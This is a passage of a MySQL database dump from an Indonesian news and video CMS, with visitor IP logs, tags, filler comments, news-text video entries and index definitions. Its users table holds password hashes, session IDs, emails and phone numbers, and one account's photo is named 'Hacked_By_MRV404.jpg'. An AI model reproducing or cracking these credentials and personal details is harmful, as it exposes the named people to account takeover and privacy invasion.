('2a03:2880:ff:20::fac', '2020-08-06', 1, '1596677826'),
('2a03:2880:ff:6f::fac', '2020-08-06', 1, '1596678042'),
('2a03:2880:ff:74::fac', '2020-08-06', 1, '1596678043'),
('2a03:2880:11ff:12::f', '2020-08-06', 1, '1596680076'),
('66.249.72.60', '2020-08-06', 1, '1596692710'),
('118.136.13.53', '2020-08-06', 24, '1596695223'),
('2a03:2880:ff:c::face', '2020-08-06', 1, '1596695059'),
('2a03:2880:ff:1a::fac', '2020-08-06', 1, '1596695062'),
('66.249.72.61', '2020-08-06', 1, '1596696741'),
('66.249.72.42', '2020-08-06', 1, '1596715491'),
('66.249.72.63', '2020-08-06', 2, '1596719163'),
('107.178.239.205', '2020-08-06', 1, '1596723536'),
('66.249.72.46', '2020-08-07', 1, '1596744513'),
('66.249.72.44', '2020-08-07', 1, '1596744521'),
('66.249.72.42', '2020-08-07', 1, '1596744533'),
('107.178.200.202', '2020-08-07', 1, '1596808691'),
('66.249.73.127', '2020-08-08', 3, '1596867974'),
('66.249.73.125', '2020-08-08', 2, '1596889712'),
('66.249.73.106', '2020-08-08', 4, '1596830901'),
('66.249.73.97', '2020-08-08', 2, '1596889713'),
('2a03:2880:11ff:1::fa', '2020-08-08', 1, '1596869485'),
('66.249.73.98', '2020-08-08', 2, '1596883101'),
('66.249.73.126', '2020-08-09', 3, '1596988634'),
('66.249.73.97', '2020-08-09', 3, '1596916721'),
('2a03:2880:ff:14::fac', '2020-08-09', 1, '1596920517'),
('104.131.79.247', '2020-08-09', 1, '1596965166'),
('104.131.73.232', '2020-08-09', 1, '1596965634'),
('35.203.245.118', '2020-08-09', 1, '1596969435'),
('66.249.73.110', '2020-08-09', 1, '1596976910'),
('104.131.43.223', '2020-08-09', 1, '1596981389'),
('2a03:2880:11ff:77::f', '2020-08-09', 1, '1596981433'),
('2a03:2880:11ff:77::f', '2020-08-09', 1, '1596981433'),
('2a03:2880:11ff:74::f', '2020-08-09', 1, '1596981435'),
('66.249.73.98', '2020-08-09', 2, '1596987444'),
('66.249.73.126', '2020-08-10', 3, '1597076946'),
('66.249.73.98', '2020-08-10', 4, '1597076949'),
('66.249.73.125', '2020-08-10', 7, '1597061482'),
('66.249.73.97', '2020-08-10', 3, '1597056085'),
('66.249.73.124', '2020-08-10', 5, '1597064505'),
('66.249.73.110', '2020-08-10', 2, '1597060273'),
('66.249.73.106', '2020-08-10', 4, '1597060273'),
('66.249.73.127', '2020-08-10', 5, '1597069752'),
('118.136.13.53', '2020-08-10', 9, '1597043184'),
('107.178.239.198', '2020-08-10', 1, '1597057076'),
('66.249.73.108', '2020-08-10', 1, '1597058481'),
('66.249.73.108', '2020-08-11', 2, '1597120489'),
('66.249.73.106', '2020-08-11', 4, '1597102457'),
('125.161.112.48', '2020-08-11', 1, '1597116817'),
('66.249.73.110', '2020-08-11', 3, '1597120979'),
('2a03:2880:31ff:12::f', '2020-08-11', 1, '1597121004'),
('2a03:2880:31ff:70::f', '2020-08-11', 1, '1597121007'),
('66.249.72.46', '2020-08-11', 2, '1597156264'),
('66.249.72.44', '2020-08-11', 3, '1597156265'),
('36.71.44.80', '2020-08-11', 1, '1597130697'),
('66.249.72.42', '2020-08-11', 1, '1597133235'),
('66.249.72.33', '2020-08-11', 3, '1597149527'),
('2a03:2880:21ff:14::f', '2020-08-11', 1, '1597135671'),
('2a03:2880:21ff:1::fa', '2020-08-11', 1, '1597135673'),
('66.249.72.62', '2020-08-12', 1, '1597174166'),
('66.249.72.60', '2020-08-12', 5, '1597211939'),
('2a03:2880:13ff:13::f', '2020-08-12', 1, '1597190224'),
('2a03:2880:13ff:75::f', '2020-08-12', 1, '1597190226'),
('66.249.72.61', '2020-08-12', 6, '1597231329'),
('2606:4700:1101:0:a25', '2020-08-12', 1, '1597201219'),
('162.158.69.154', '2020-08-12', 11, '1597201290'),
('173.252.127.11', '2020-08-12', 1, '1597201681'),
('2a03:2880:21ff:10::f', '2020-08-12', 1, '1597201682'),
('66.249.72.34', '2020-08-12', 4, '1597225351'),
('2a03:2880:21ff:77::f', '2020-08-12', 1, '1597202260'),
('2a03:2880:21ff:70::f', '2020-08-12', 1, '1597202261'),
('66.249.72.44', '2020-08-12', 1, '1597202731'),
('2a03:2880:31ff:6f::f', '2020-08-12', 1, '1597202738'),
('66.249.72.46', '2020-08-12', 2, '1597242560'),
('2a03:2880:31ff:15::f', '2020-08-12', 1, '1597202883'),
('2a03:2880:31ff:17::f', '2020-08-12', 1, '1597202886'),
('66.249.72.33', '2020-08-12', 1, '1597206471'),
('140.213.9.118', '2020-08-12', 1, '1597207688'),
('2a03:2880:22ff:2::fa', '2020-08-12', 1, '1597211949'),
('2a03:2880:22ff:78::f', '2020-08-12', 1, '1597211951'),
('107.178.200.202', '2020-08-12', 1, '1597220013'),
('66.249.72.63', '2020-08-12', 3, '1597231333'),
('2a03:2880:21ff:a::fa', '2020-08-12', 1, '1597221071'),
('2a03:2880:21ff:a::fa', '2020-08-12', 1, '1597221073'),
('2a03:2880:11ff:9::fa', '2020-08-12', 1, '1597231344'),
('2a03:2880:11ff:7::fa', '2020-08-12', 1, '1597231347'),
('66.249.72.61', '2020-08-13', 2, '1597259987'),
('66.249.72.63', '2020-08-13', 1, '1597259982'),
('66.249.73.110', '2020-08-13', 1, '1597286148'),
('66.249.73.108', '2020-08-13', 1, '1597286149'),
('2a03:2880:12ff:1::fa', '2020-08-13', 1, '1597306354'),
('35.203.245.114', '2020-08-13', 1, '1597308104'),
('66.249.65.251', '2020-08-13', 1, '1597330455'),
('66.249.65.249', '2020-08-13', 1, '1597330457'),
('2a03:2880:10ff:18::f', '2020-08-13', 1, '1597330497'),
('2a03:2880:10ff:1::fa', '2020-08-13', 1, '1597330499'),
('66.249.65.253', '2020-08-13', 2, '1597332883'),
('2a03:2880:11ff:5::fa', '2020-08-13', 1, '1597332937'),
('2a03:2880:11ff:6::fa', '2020-08-13', 1, '1597332938'),
('66.249.65.249', '2020-08-14', 3, '1597345813'),
('2a03:2880:ff:a::face', '2020-08-14', 1, '1597355674'),
('125.160.115.17', '2020-08-14', 1, '1597361910'),
('66.249.65.251', '2020-08-14', 5, '1597373223'),
('66.249.65.253', '2020-08-14', 6, '1597380441'),
('66.249.65.238', '2020-08-14', 2, '1597379844'),
('2a03:2880:32ff:71::f', '2020-08-14', 1, '1597373274'),
('2a03:2880:32ff:f::fa', '2020-08-14', 1, '1597373276'),
('66.249.65.240', '2020-08-14', 2, '1597384062'),
('2a03:2880:21ff::face', '2020-08-14', 1, '1597380450'),
('2a03:2880:21ff:3::fa', '2020-08-14', 1, '1597380451'),
('66.249.65.236', '2020-08-14', 1, '1597384064');

-- --------------------------------------------------------

--
-- Struktur dari tabel `tag`
--

CREATE TABLE `tag` (
  `id_tag` int(5) NOT NULL,
  `nama_tag` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `tag_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `count` int(5) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `tag`
--

INSERT INTO `tag` (`id_tag`, `nama_tag`, `username`, `tag_seo`, `count`) VALUES
(22, 'Hiburan', '', 'hiburan', 19),
(28, 'Teknologi', '', 'teknologi', 12),
(27, 'Metropolitan', '', 'metropolitan', 32),
(26, 'Nasional', '', 'nasional', 42),
(25, 'Kesehatan', '', 'kesehatan', 16),
(24, 'Olahraga', '', 'olahraga', 11),
(34, 'Wisata', '', 'wisata', 4),
(36, 'Hukum', '', 'hukum', 16),
(37, 'Film', '', 'film', 25),
(40, 'Internasional', '', 'internasional', 28),
(41, 'Bola', '', 'bola', 21),
(43, 'Selebritis', '', 'selebritis', 9),
(49, 'Palestina', 'admin', 'palestina', 6),
(50, 'Israel', 'admin', 'israel', 3),
(51, 'Yahudi', 'admin', 'yahudi', 4);

-- --------------------------------------------------------

--
-- Struktur dari tabel `tagvid`
--

CREATE TABLE `tagvid` (
  `id_tag` int(5) NOT NULL,
  `nama_tag` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `tag_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `count` int(5) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `tagvid`
--

INSERT INTO `tagvid` (`id_tag`, `nama_tag`, `username`, `tag_seo`, `count`) VALUES
(34, 'perang', 'admin', 'perang', 2),
(35, 'Teknologi', 'admin', 'teknologi', 0),
(36, 'Nasional', 'admin', 'nasional', 1);

-- --------------------------------------------------------

--
-- Struktur dari tabel `tbl_comment`
--

CREATE TABLE `tbl_comment` (
  `id_komentar` int(5) NOT NULL,
  `reply` int(5) NOT NULL,
  `nama_lengkap` varchar(150) NOT NULL,
  `alamat_email` varchar(150) NOT NULL,
  `isi_pesan` text NOT NULL,
  `tanggal_komentar` date NOT NULL,
  `jam_komentar` time NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `tbl_comment`
--

INSERT INTO `tbl_comment` (`id_komentar`, `reply`, `nama_lengkap`, `alamat_email`, `isi_pesan`, `tanggal_komentar`, `jam_komentar`) VALUES
(1, 0, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'Perubahan UUD 1945 yang membawa perubahan mendasar mengenai penyelengaraan kekuasaan kehakiman, membuat perlunya dilakukan perubahan secara komprehensif mengenai Undang-Undang Ketentuan-ketentuan Pokok Kekuasaan Kehakiman.								', '2014-11-19', '00:00:00'),
(2, 1, 'si anu', 'anu@gmail.com', 'Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.', '2014-11-19', '00:00:00'),
(3, 0, 'Rio Saputra', 'rio.saputra@gmail.com', 'Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut. Perubahan UUD 1945 yang membawa perubahan mendasar mengenai penyelengaraan kekuasaan kehakiman.								', '2014-11-21', '00:00:00'),
(4, 1, 'Anggun Pratiwi', 'angun@gmail.com', 'itu benar bro, kalau ndak pacayo tanyo lah ka baruak.Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.', '2014-11-21', '00:00:00'),
(5, 3, 'Dewi Safitri', 'dewi.safitri@gmail.com', 'Oii, ang kareh bana mah, den ambuang ang ka lauik beko,.. Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.', '2014-11-21', '00:00:00'),
(6, 0, 'Ahmad Hunaldi', 'ahmad@gmail.com', 'badan-badan peradilan penyelenggara kekuasaan kehakiman, asas-asas penyelengaraan kekuasaan kehakiman Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.								', '2014-11-21', '00:00:00'),
(7, 6, 'Prasmana Enru', 'prasmana@gmail.com', 'Undang-Undang Ketentuan-ketentuan Pokok Kekuasaan	Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.', '2014-11-21', '00:00:00'),
(9, 3, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'Untuk itulah penulis memberikan solusi menggunakan program Dreamweaver,.. Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.', '2015-01-22', '00:00:00'),
(14, 0, 'Udin Sedunia', 'udin.sedubia@gmail.com', 'Perlahan tapi pasti, sosok TM yang merupakan artis dan berprofesi sebagai Pekerja Seks Komersial (PSK) akhirnya mulai terungkap Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.', '2015-05-29', '00:54:31'),
(15, 6, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'Perlahan tapi pasti, sosok TM yang merupakan artis dan berprofesi sebagai Pekerja Seks Komersial (PSK) akhirnya mulai terungkap Video bocah melakukan hubungan intim layaknya suami istri membuat geger. Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut.', '2015-05-29', '00:59:50'),
(23, 20, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'I spent almost a day searching for this. And found &#039;CSS3 Thumbnail Slider&#039; on this site. Thanks a lot. If the slideIndex is higher than the number of elements (x.length), the slideIndex is set to zero.', '2017-01-24', '16:31:47'),
(24, 14, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'Guna mencegah hal-hal yang tidak diinginkan, polisi pun sudah melakukan penelusuran siapa orang di balik pembuatan video cabul tersebut', '2017-04-09', '11:07:23');

-- --------------------------------------------------------

--
-- Struktur dari tabel `templates`
--

CREATE TABLE `templates` (
  `id_templates` int(5) NOT NULL,
  `judul` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `pembuat` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `folder` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'N'
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `templates`
--

INSERT INTO `templates` (`id_templates`, `judul`, `username`, `pembuat`, `folder`, `aktif`) VALUES
(22, 'Mstore Magazine Template', 'admin', 'Nashiruddien Sadid Mustaqim', 'phpmu-magazine', 'Y'),
(24, 'Mstore Personal Template', 'admin', 'Nashiruddien Sadid Mustaqim', 'phpmu-standar', 'N');

-- --------------------------------------------------------

--
-- Struktur dari tabel `users`
--

CREATE TABLE `users` (
  `username` varchar(50) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `password` varchar(255) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `nama_lengkap` varchar(100) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `email` varchar(100) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `no_telp` varchar(20) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `foto` varchar(100) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `level` varchar(20) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL DEFAULT 'user',
  `blokir` enum('Y','N') CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL DEFAULT 'N',
  `id_session` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `users`
--

INSERT INTO `users` (`username`, `password`, `nama_lengkap`, `email`, `no_telp`, `foto`, `level`, `blokir`, `id_session`) VALUES
('admin', '710f2b1e0d7d62d48d1e2d2934217c4c17fc303fd31e6f915b47d1a2643eba0646cdbedb8f695d9cc9f812892fd68941a4cd46296b556935e62987e1f7baf1f8', 'Nashiruddien Sadid M', 'nsm180818@gmail.com', '085692650482', 'IMG-20200614-WA0007_(2).jpg', 'admin', 'N', 'q173s8hs1jl04st35169ccl8o7'),
('mstore', 'bff0cc42103de1b4721370e84dc24f635a7afeca41198c9b3e03946a1b6b7191d14356408a5e57ce6daf77e6e800c66fac7ab0482d57d48d23e6808e4b562daa', 'Mstore Indonesia', 'mstoreindonesia@gmail.com', '087782129053', 'logo_multigroup.jpg', 'admin', 'N', '739f182967c587c266612022316a342e-20200707164729'),
('lily', '7c11c894d2fcd4784bd3bb509239202e00312be0e17999f6b4512235082266b304ce35f97634b1102dfb426df8ea4c97932566ee200bbb38f23f830d0d4d9cba', 'lily', 'nsm180818@gmail.com', '085692650482', 'doctor3.png', 'admin', 'N', '89f288757f4d0693c99b007855fc075e-20200715191041'),
('jnsns', 'b594e8fad2357fa00125254ab44857d1be24d59591ee485ee0e60dc96268957ba342585095add299dc42872a87d8664f6e4c47f512e8190693846df3bac57379', 'ddazjntm', 'hahahasaaggh@gmail.com', '0882727277', 'IMG-20200721-WA0001.jpeg', 'kontributor', 'N', 'bc04b4bb77ae8816e7d3664389cf4611-20200721085439'),
('Ryval123', '00daf9dac920abd9e9a3f97327961c14c5cc580aa3d0858d58ce6391e9380708517dca173ed585a678914b58f9b20a9b4c860d01f1ded398bc409d2d0d75d10e', 'Ryval Vramnaka', 'amoraxcode@gmail.com', '086527363734', 'Hacked_By_MRV404.jpg', 'kontributor', 'N', '1b6199357538cae54c9b8799c982369c-20200726212937');

-- --------------------------------------------------------

--
-- Struktur dari tabel `users_modul`
--

CREATE TABLE `users_modul` (
  `id_umod` int(11) NOT NULL,
  `id_session` varchar(255) NOT NULL,
  `id_modul` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `users_modul`
--

INSERT INTO `users_modul` (`id_umod`, `id_session`, `id_modul`) VALUES
(1, 'ed1d859c50262701d92e5cbf39652792-20170120090507', 70),
(2, 'ed1d859c50262701d92e5cbf39652792-20170120090507', 65),
(3, 'ed1d859c50262701d92e5cbf39652792-20170120090507', 63),
(4, 'f76ad5ee772ac196cbc09824e24859ee', 70),
(5, 'f76ad5ee772ac196cbc09824e24859ee', 65),
(6, 'f76ad5ee772ac196cbc09824e24859ee', 63),
(7, 'ed1d859c50262701d92e5cbf39652792-20170120090507', 18),
(8, 'ed1d859c50262701d92e5cbf39652792-20170120090507', 66),
(9, 'ed1d859c50262701d92e5cbf39652792-20170120090507', 33),
(10, '3460d81e02faa3559f9e02c9a766fcbd-20170124215625', 18),
(11, 'ed1d859c50262701d92e5cbf39652792-20170120090507', 41),
(12, '6bec9c852847242e384a4d5ac0962ba0-20170406140423', 18),
(13, 'fa7688658d8b38aae731826ea1daebb5-20170521103501', 18),
(14, 'cfcd208495d565ef66e7dff9f98764da-20180421112213', 18),
(15, 'bc04b4bb77ae8816e7d3664389cf4611-20200721085439', 18),
(16, '1b6199357538cae54c9b8799c982369c-20200726212937', 18);

-- --------------------------------------------------------

--
-- Struktur dari tabel `video`
--

CREATE TABLE `video` (
  `id_video` int(5) NOT NULL,
  `id_playlist` int(5) NOT NULL,
  `username` varchar(30) COLLATE latin1_general_ci NOT NULL,
  `jdl_video` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `video_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `keterangan` text COLLATE latin1_general_ci NOT NULL,
  `gbr_video` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `video` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `youtube` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `dilihat` int(7) NOT NULL DEFAULT 1,
  `hari` varchar(20) COLLATE latin1_general_ci NOT NULL,
  `tanggal` date NOT NULL,
  `jam` time NOT NULL,
  `tagvid` varchar(100) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `video`
--

INSERT INTO `video` (`id_video`, `id_playlist`, `username`, `jdl_video`, `video_seo`, `keterangan`, `gbr_video`, `video`, `youtube`, `dilihat`, `hari`, `tanggal`, `jam`, `tagvid`) VALUES
(160, 56, 'admin', 'Selamatkan Hutan di Indonesia', 'selamatkan-hutan-di-indonesia', 'Pengamat politik dari Charta Politika, Yunarto Wijaya mempertanyakan dasar keputusan SBY menunjuk Roy Suryo sebagai Menpora. Apalagi, kata Yunarto, ada pernyataan SBY yang menegaskan Roy cakap untuk mengemban tugas sebagai Menpora.\r\n\r\nMenurut Yunarto, Roy selama ini lebih dikenal sebagai pakar foto digital dan video serta dosen di sebuah perguruan tinggi negeri. \"Namun, belum terdengar kiprahnya di bidang kepemudaan dan olahraga,\" kata Yunarto. Sementara, tugas Menpora yang berat dan masa tugasnya relatif singkat idealnya mengutamakan figur yang kompetensinya teruji di bidang kepemudaan dan olahraga.\r\n\r\nKarena itu, Yunarto menduga penunjukan Roy bukan karena kompetensi, melainkan representasi politik. \"Ditunjuknya kader Partai Demokrat Roy Suryo sebagai Menpora menunjukkan faktor politisnya sangat kuat,\" katanya.', '', '', 'http://www.youtube.com/embed/hkzpLJjZQbA', 32, 'Rabu', '2014-07-02', '07:30:12', ''),
(161, 56, 'admin', 'Hutan Hujan Tropis Indonesia', 'hutan-hujan-tropis-indonesia', 'Pihak Partai Liberal Demokrat pun langsung melontarkan kecaman atas tulisan dari Ward. Juru bicara partai mengatakan bahwa pihak partainya akan menerapkan sanksi terhadap Ward.\r\n\r\nSementara pihak Partai Konservatif yang menguasai koalisi pemerintahan bersama Liberal Demokrat menyatakan Ward harus menarik komentarnya.\r\n\r\n\"Tidak seharusnya seorang anggota parlemen menulis tindakan yang memicu kekerasan. Tindakannya tidak bertanggung jawab,\" ucap pihak Konservatif.\r\n\r\nIni bukan pertama kalinya Ward mengecam tindakan Israel. Pada Juli 2013 lalu, Ward menyebut pihak Zionis diambang kekalahan dalam perang. Dirinya pun mempertanyakan sampai kapan negara apartheid seperti Israel bisa bertahan.', '', '', 'http://www.youtube.com/embed/5biK_PcT7S0', 30, 'Rabu', '2014-07-02', '07:31:23', ''),
(162, 57, 'admin', 'Perang Sengit Pasukan Darat Israel Vs Hamas', 'perang-sengit-pasukan-darat-israel-vs-hamas', 'Israel makin gencar melakukan serangan ke Gaza, baik melalui udara maupun darat. Masjid menjadi salah satu target serangan dari Negara Yahudi itu.\r\n\r\nSekira 15 warga Palestina dilaporkan tewas dan 20 lainnya dalam serangan udara Isarel ke sebuah masjid di Kota Gaza pada Sabtu 19 Juli 2014 lalu. Masjid itu terletak tidak jauh dari rumah milik Komandan Polisi Gaza.\r\n\r\nRudal-rudal dari Israel menghancurkan sebagian dari bangunan masjid. Alquran yang berada di dalam masjid pun tampak rusak akibat serangan. Demikian diberitakan Associated Press, Rabu (23/7/2014).\r\n\r\nSelain itu, serangan Israel juga diarahkan ke rumah sakit yang berada di Gaza. Blokade yang dilakukan oleh Israel makin membuat rumah sakit sulit untuk beroperasi.', '', '', 'https://www.youtube.com/watch?v=CeNjeD8yknI', 20, 'Rabu', '2014-07-23', '15:23:10', ''),
(163, 57, 'admin', 'Isael dan Palestina Memanas', 'isael-dan-palestina-memanas', 'Khamenei dikenal sebagai musuh besar Israel. Beberapa komentarnya membuat panas telinga pemimpin Israel.\r\n\r\nKomentar paling pedas Khamenei adalah Iran tidak pernah mengenal Israel. Negara ini juga secara terang-terangan mendukung Hamas. Hamas sendiri sudah dimasukan ke dalam daftar hitam terorisme oleh Israel.\r\n\r\nSelain itu, Khamenei dan beberapa pemimpin Iran berjanji akan menghilangkan Israel dari peta dunia. Bahkan, beberapa pekan lalu, Khamenei menyatakan peristiwa pembantaian warga Yahudi oleh Nazi satu abad lalu, hanyalah sebuah ilusi yang tak nyata.', '', '', 'https://www.youtube.com/watch?v=oaJpxuDh5Ds', 34, 'Rabu', '2014-07-23', '15:24:30', ''),
(164, 57, 'admin', 'Israel Tembak Mati Warga Palestina Saat Gencatan', 'israel-tembak-mati-warga-palestina-saat-gencatan', 'Seorang tentara Israel dilaporkan menghilang di Jalur Gaza. Hal ini terjadi usai terjadinya pertempuran mematikan yang terjadi di Jalur Gaza pada akhir pekan lalu.\r\n\r\nMelansir Boston Herald, Selasa (22/7/2014), pejabat pertahanan Israel mengatakan, tentaranya hilang usai pertempuran mematikan di Gaza terjadi pada pekan lalu. Namun, tidak jelas apakah tentara tersebut masih hidup atau sudah tewas.\r\n\r\nKonflik yang terjadi antara Israel dan Hamas sejauh ini sudah menyebabkan sekira 25 tentara Israel tewas dan ratusan warga Palestina. Sebagian besar korban warga Palestina adalah anak-anak.\r\n\r\nMemanasnya situasi itu membuat sejumlah desakan gencatan berdatangan dari sejumlah negara dan organisasi internasional.\r\n\r\nSebelumnya, Sekretaris Jendral Perserikatan Bangsa - Bangsa (PBB) Ban Ki-moon dan Menteri Luar Negeri Amerika Serikat (AS) John Kerry melakukan pertemuan di Kairo, Mesir. Pertemuan di bertujuan untuk mendesak agar konflik yang terjadi di Gaza segera dihentikan.', '', '', 'https://www.youtube.com/watch?v=L6R-5XUcDSY', 48, 'Rabu', '2014-07-23', '15:29:41', ''),
(165, 57, 'admin', 'Gaza conflict: Israel & Hamas face allegations of war crimes', 'gaza-conflict-israel--hamas-face-allegations-of-war-crimes', '<p>Sebelumnya, Sekretaris Jendral Perserikatan Bangsa - Bangsa (PBB) Ban Ki-moon dan Menteri Luar Negeri Amerika Serikat (AS) John Kerry melakukan pertemuan di Kairo, Mesir. Pertemuan di bertujuan untuk mendesak agar konflik yang terjadi di Gaza segera dihentikan. Mengingat agresi yang militer yang dilancarkan Israel merupakan pelanggaran hukum humaniter internasional. Menyusul banyak warga sipil yang telah menjadi korban akibat pertempuran yang dilakukan Israel dan Hamas. Sebelumnya, Sekretaris Jendral Perserikatan Bangsa - Bangsa (PBB) Ban Ki-moon dan Menteri Luar Negeri Amerika Serikat (AS) John Kerry melakukan pertemuan di Kairo, Mesir. Pertemuan di bertujuan untuk mendesak agar konflik yang terjadi di Gaza segera dihentikan. Mengingat agresi yang militer yang dilancarkan Israel merupakan pelanggaran hukum humaniter internasional. Menyusul banyak warga sipil yang telah menjadi korban akibat pertempuran yang dilakukan Israel dan Hamas.</p>\r\n', '', '', 'http://www.youtube.com/embed/aqI4DOilySg', 62, 'Minggu', '2014-08-17', '16:49:33', ''),
(166, 57, 'admin', 'Chomsky: Calling for change on US support for Israelll', 'chomsky-calling-for-change-on-us-support-for-israelll', '<p>Pemimpin tertinggi Iran, Ayatollah Ali Khamenei menyampaikan pernyataan kontroversial terkait ketegangan di Gaza. Khamenei mendorong agar Palestina terus melawan Israel. \"Salah satu cara untuk menghentikan rezim kurang ajar ini adalah melanjutkan perlawanan dan dan perjuangan bersenjata harus diperluas ke Tepi Barat,\" sebut Khamenei, seperti dikutip dari IRNA, Kamis (24/7/2014). Khamenei dikenal sebagai musuh besar Israel. Beberapa komentarnya membuat panas telinga pemimpin Israel.</p>\r\n\r\n<p>Pemimpin tertinggi Iran, Ayatollah Ali Khamenei menyampaikan pernyataan kontroversial terkait ketegangan di Gaza. Khamenei mendorong agar Palestina terus melawan Israel. Salah satu cara untuk menghentikan rezim kurang ajar ini adalah melanjutkan perlawanan dan dan perjuangan bersenjata harus diperluas ke Tepi Barat, sebut Khamenei, seperti dikutip dari IRNA, Kamis (24/7/2014). Khamenei dikenal sebagai musuh besar Israel. Beberapa komentarnya membuat panas telinga pemimpin Israel.</p>\r\n', '', '', 'http://www.youtube.com/embed/gQRJEnoxr2A', 174, 'Minggu', '2014-08-17', '16:51:04', 'perang');

--
-- Indexes for dumped tables
--

--
-- Indeks untuk tabel `agenda`
--
ALTER TABLE `agenda`
  ADD PRIMARY KEY (`id_agenda`);

--
-- Indeks untuk tabel `album`
--
ALTER TABLE `album`
  ADD PRIMARY KEY (`id_album`);

--
-- Indeks untuk tabel `background`
--
ALTER TABLE `background`
  ADD PRIMARY KEY (`id_background`);

--
-- Indeks untuk tabel `banner`
--
ALTER TABLE `banner`
  ADD PRIMARY KEY (`id_banner`);

--
-- Indeks untuk tabel `berita`
--
ALTER TABLE `berita`
  ADD PRIMARY KEY (`id_berita`);

--
-- Indeks untuk tabel `download`
--
ALTER TABLE `download`
  ADD PRIMARY KEY (`id_download`);

--
-- Indeks untuk tabel `gallery`
--
ALTER TABLE `gallery`
  ADD PRIMARY KEY (`id_gallery`);

--
-- Indeks untuk tabel `halamanstatis`
--
ALTER TABLE `halamanstatis`
  ADD PRIMARY KEY (`id_halaman`);

--
-- Indeks untuk tabel `header`
--
ALTER TABLE `header`
  ADD PRIMARY KEY (`id_header`);

--
-- Indeks untuk tabel `hubungi`
--
ALTER TABLE `hubungi`
  ADD PRIMARY KEY (`id_hubungi`);

--
-- Indeks untuk tabel `identitas`
--
ALTER TABLE `identitas`
  ADD PRIMARY KEY (`id_identitas`);

--
-- Indeks untuk tabel `iklanatas`
--
ALTER TABLE `iklanatas`
  ADD PRIMARY KEY (`id_iklanatas`);

--
-- Indeks untuk tabel `iklantengah`
--
ALTER TABLE `iklantengah`
  ADD PRIMARY KEY (`id_iklantengah`);

--
-- Indeks untuk tabel `katajelek`
--
ALTER TABLE `katajelek`
  ADD PRIMARY KEY (`id_jelek`);

--
-- Indeks untuk tabel `kategori`
--
ALTER TABLE `kategori`
  ADD PRIMARY KEY (`id_kategori`);

--
-- Indeks untuk tabel `komentar`
--
ALTER TABLE `komentar`
  ADD PRIMARY KEY (`id_komentar`);

--
-- Indeks untuk tabel `komentarvid`
--
ALTER TABLE `komentarvid`
  ADD PRIMARY KEY (`id_komentar`);

--
-- Indeks untuk tabel `logo`
--
ALTER TABLE `logo`
  ADD PRIMARY KEY (`id_logo`);

--
-- Indeks untuk tabel `menu`
--
ALTER TABLE `menu`
  ADD PRIMARY KEY (`id_menu`);

--
-- Indeks untuk tabel `modul`
--
ALTER TABLE `modul`
  ADD PRIMARY KEY (`id_modul`);

--
-- Indeks untuk tabel `mod_alamat`
--
